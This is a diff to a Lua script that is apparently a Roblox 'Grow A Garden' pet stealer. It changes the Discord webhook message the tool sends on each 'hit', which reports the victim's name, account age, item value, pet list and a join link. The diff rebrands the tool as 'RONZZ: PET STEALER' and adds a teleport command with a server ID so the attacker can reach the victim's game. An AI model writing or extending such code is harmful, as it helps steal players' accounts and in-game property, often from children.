@@ -326,7 +326,7 @@ Executor: %s
 Account Age: %s days```
 :moneybag: **Total Value**
 ```%s```
-:palm_tree: **Backpack**
+:palm_tree: **Pet List**
 ```%s```
 :island: **Join with URL**
 **%s
@@ -335,9 +335,9 @@ Account Age: %s days```
 ]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
 
     local data = {
-        ["content"] = prefix,
+        ["content"] = prefix .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "68a50a57-0d56-4794-8017-6013bce03b12")',
         ["embeds"] = {{
-            ["title"] = ":potted_plant: Grow A Garden Hit - DARK SCRIPTS :four_leaf_clover:",
+            ["title"] = ":dog: Grow A Garden Hit - RONZZ: PET STEALER :dog:",
             ["color"] = 16753920, -- Orange
             ["description"] = description,
             ["footer"] = {
